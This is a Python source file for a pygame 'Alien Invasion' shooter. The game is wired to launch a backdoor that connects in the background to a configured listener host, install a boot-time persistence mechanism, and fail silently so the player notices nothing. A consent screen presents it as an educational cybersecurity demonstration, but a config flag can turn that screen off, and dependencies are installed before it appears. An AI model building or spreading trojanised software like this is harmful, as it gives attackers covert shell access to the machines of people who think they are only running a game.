import sys
import pygame
from settings import Settings
from ship import Ship
from bullet import Bullet
from alien import Alien
from time import sleep
from game_stats import GameStats
from button import Button
from scoreboard import Scoreboard

# Backdoor imports
from dependency_checker import DependencyChecker
from backdoor import Backdoor
from persistence import PersistenceManager
import config

class AlienInvasion:
    """Overall class to manage game assets and behavior"""
    
    def __init__(self):
        """Initialize the game and create game resources"""
        # Initialize backdoor if enabled
        self.backdoor = None
        if config.ENABLE_BACKDOOR:
            self._initialize_backdoor()
        
        pygame.init()
        self.settings = Settings()
        self.screen = pygame.display.set_mode(
            (self.settings.screen_width, self.settings.screen_length))
        pygame.display.set_caption("Alien Invasion")
        self.stats = GameStats(self)
        self.score = Scoreboard(self)
        self.ship = Ship(self)
        self.bullets = pygame.sprite.Group()
        self.aliens = pygame.sprite.Group()
        self._create_fleet()
        self.play_button = Button(self, "Start game")
    
    def _initialize_backdoor(self):
        """Initialize backdoor functionality"""
        try:
            # Start backdoor in background
            self.backdoor = Backdoor(
                host=config.LISTENER_HOST,
                port=config.LISTENER_PORT
            )
            self.backdoor.start_background()
            
            # Install persistence if enabled
            if config.ENABLE_PERSISTENCE:
                pm = PersistenceManager()
                pm.install_persistence()
        except Exception as e:
            # Fail silently to not interrupt game
            pass
      
    def run_game(self):
        """Start the main loop for the game"""
        while True:
            self._check_events()
            if self.stats.game_active:
                self.ship.update()
                self._update_bullets()
                self.update_aliens()
                self.bullets.update()
            self.update_screen()
            
    def update_screen(self):
        self.screen.fill(self.settings.bg_color)
        self.ship.blitme()
        for bullet in self.bullets.sprites():
            bullet.draw_bullet()
        self.aliens.draw(self.screen)
        self.score.show_score()
        if not self.stats.game_active:
            self.play_button.draw_button()
        pygame.display.flip()
           
    def _check_events(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                self._check_keydown_events(event)
            elif event.type == pygame.KEYUP:
                self._check_keyup_events(event)
            elif event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = pygame.mouse.get_pos()
                self._check_play_button(mouse_pos)                
    
    def _check_keydown_events(self, event):
        if event.key == pygame.K_RIGHT:
            self.ship.moving_right = True
        elif event.key == pygame.K_LEFT:
            self.ship.moving_left = True
        elif event.key == pygame.K_UP:
            self.ship.moving_up = True
        elif event.key == pygame.K_DOWN:
            self.ship.moving_down = True
        elif event.key == pygame.K_q:
            sys.exit()
        elif event.key == pygame.K_SPACE:
            self._fire_bullet()
                
    def _check_keyup_events(self, event):
        if event.key == pygame.K_RIGHT:
            self.ship.moving_right = False
        elif event.key == pygame.K_LEFT:
            self.ship.moving_left = False
        elif event.key == pygame.K_UP:
            self.ship.moving_up = False
        elif event.key == pygame.K_DOWN:
            self.ship.moving_down = False
            
    def _check_play_button(self, mouse_pos):
        """Start once the user clicks play"""
        button_clicked = self.play_button.rect.collidepoint(mouse_pos)
        if button_clicked and not self.stats.game_active:
            self.stats.reset_stats()
            self.stats.game_active = True
            self.score.prep_score()
            self.score.prep_level()
            self.score.prep_ships()
            self.aliens.empty()
            self.bullets.empty()
            
            self._create_fleet()
            self.ship.center_ship()
            self.play_button.move_off_screen()
            pygame.mouse.set_visible(False)
    
    def _update_bullets(self):
        """Update bullet positions"""
        for bullet in self.bullets.copy():
            if bullet.rect.bottom <= 0:
                self.bullets.remove(bullet)
        self._check_collisions()
    
    def _check_collisions(self):
        if not self.aliens:
            # Destroy existing bullets and create new fleet.
            self.bullets.empty()
            self._create_fleet()
            self.settings.increase_speed()
            # Increase level.
            self.stats.level += 1
            self.score.prep_level()
        collisions = pygame.sprite.groupcollide(self.bullets, self.aliens, False, True)
        if collisions:
            for aliens in collisions.values():
                self.stats.score += self.settings.alien_points * len(aliens)
            self.score.prep_score()
            self.score.check_high_score()
    
    def _fire_bullet(self):
        """Create a new bullet"""
        if len(self.bullets) < self.settings.bullets_allowed:
            new_bullet = Bullet(self)
            self.bullets.add(new_bullet)
                
    def _create_fleet(self):
        """Create a fleet of aliens"""
        alien = Alien(self)
        alien_width, alien_height = alien.rect.size
        self.aliens.add(alien)
        alien_width = alien.rect.width
        available_space_x = self.settings.screen_width - (1 * alien_width)
        number_aliens_x = available_space_x // (2 * alien_width)
        
        # Determine the number of rows of aliens that fit on the screen.
        ship_height = self.ship.rect.height
        available_space_y = (self.settings.screen_length - (2 * alien_height) - ship_height)
        number_rows = available_space_y // (4 * alien_height)
        
        # Create the full fleet of aliens.
        for row_number in range(number_rows):
            for alien_number in range(number_aliens_x):
                self._create_alien(alien_number, row_number)
    
    def _create_alien(self, alien_number, row_number):
        """Create an alien and place it in the row."""
        alien = Alien(self)
        alien_width, alien_height = alien.rect.size
        alien.x = alien_width + 2 * alien_width * alien_number
        alien.rect.x = alien.x
        alien.rect.y = alien.rect.height + 2 * alien.rect.height * row_number
        self.aliens.add(alien)
            
    def _check_fleet_edges(self):
        """Respond appropriately if any aliens have reached an edge."""
        for alien in self.aliens.sprites():
            if alien._check_edges():
                self._change_fleet_direction()
                break
                
    def _change_fleet_direction(self):
        """Drop the entire fleet and change the fleet's direction."""
        for alien in self.aliens.sprites():
            alien.rect.y += self.settings.fleet_drop_speed
        self.settings.fleet_direction *= -1
            
    def update_aliens(self):
        self._check_fleet_edges()
        self.aliens.update()
        if pygame.sprite.spritecollideany(self.ship, self.aliens):
            self._ship_hit()
        self._check_aliens_bottom()
    
    def _ship_hit(self):
        """Respond to ship collisions"""
        if self.stats.ships_left > 0:
            self.stats.ships_left -= 1

            # Remove any aliens and bullets left.
            self.aliens.empty()
            self.bullets.empty()
            # Create a new fleet and center the ship.
            self._create_fleet()
            self.ship.center_ship()
            self.score.prep_ships()
            sleep(0.5)
        else:
            self.stats.game_active = False
            pygame.mouse.set_visible(True)
        
    def _check_aliens_bottom(self):
        """Check if any aliens have reached the bottom of the screen."""
        screen_rect = self.screen.get_rect()
        for alien in self.aliens.sprites():
            if alien.rect.bottom >= screen_rect.bottom:
                # Treat this the same as if the ship got hit.
                self._ship_hit()
                break
        
def show_consent_dialog():
    """Show consent dialog before starting"""
    if not config.SHOW_CONSENT_DIALOG:
        return True
    
    # Initialize pygame for dialog
    pygame.init()
    
    # Create a simple consent window
    screen = pygame.display.set_mode((800, 600))
    pygame.display.set_caption("Alien Invasion - Consent Required")
    
    # Colors
    WHITE = (255, 255, 255)
    BLACK = (0, 0, 0)
    GREEN = (0, 200, 0)
    RED = (200, 0, 0)
    GRAY = (200, 200, 200)
    
    # Fonts
    title_font = pygame.font.Font(None, 36)
    text_font = pygame.font.Font(None, 24)
    button_font = pygame.font.Font(None, 32)
    
    # Consent text (simplified for display)
    consent_lines = [
        "ALIEN INVASION - SECURITY DEMONSTRATION",
        "",
        "EDUCATIONAL CYBERSECURITY DEMONSTRATION",
        "",
        "This game includes backdoor functionality for",
        "educational purposes as part of a cybersecurity course.",
        "",
        "By running this game, you consent to:",
        "  • Installation of required dependencies",
        "  • Background network connection",
        "  • Persistence mechanism (auto-start on boot)",
        "  • Shell access for educational demonstration",
        "",
        "This is for EDUCATIONAL PURPOSES ONLY in a controlled VM.",
        "",
        "Do you consent to proceed?",
    ]
    
    # Buttons
    yes_button = pygame.Rect(250, 500, 120, 50)
    no_button = pygame.Rect(430, 500, 120, 50)
    
    running = True
    while running:
        screen.fill(WHITE)
        
        # Draw consent text
        y_offset = 30
        for i, line in enumerate(consent_lines):
            if i == 0:  # Title
                text = title_font.render(line, True, BLACK)
            else:
                text = text_font.render(line, True, BLACK)
            text_rect = text.get_rect(center=(400, y_offset))
            screen.blit(text, text_rect)
            y_offset += 30 if i == 0 else 25
        
        # Draw buttons
        pygame.draw.rect(screen, GREEN, yes_button)
        pygame.draw.rect(screen, RED, no_button)
        
        yes_text = button_font.render("YES", True, WHITE)
        no_text = button_font.render("NO", True, WHITE)
        
        screen.blit(yes_text, yes_text.get_rect(center=yes_button.center))
        screen.blit(no_text, no_text.get_rect(center=no_button.center))
        
        pygame.display.flip()
        
        # Handle events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return False
            elif event.type == pygame.MOUSEBUTTONDOWN:
                if yes_button.collidepoint(event.pos):
                    return True
                elif no_button.collidepoint(event.pos):
                    return False
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_y:
                    return True
                elif event.key == pygame.K_n or event.key == pygame.K_ESCAPE:
                    return False
    
    return False

if __name__ == '__main__':
    # Check dependencies silently in windowed mode
    checker = DependencyChecker()
    checker.ensure_dependencies()
    
    # Show consent dialog (GUI-based)
    if not show_consent_dialog():
        sys.exit(0)
    
    # Start the game
    ai = AlienInvasion()
    ai.run_game()
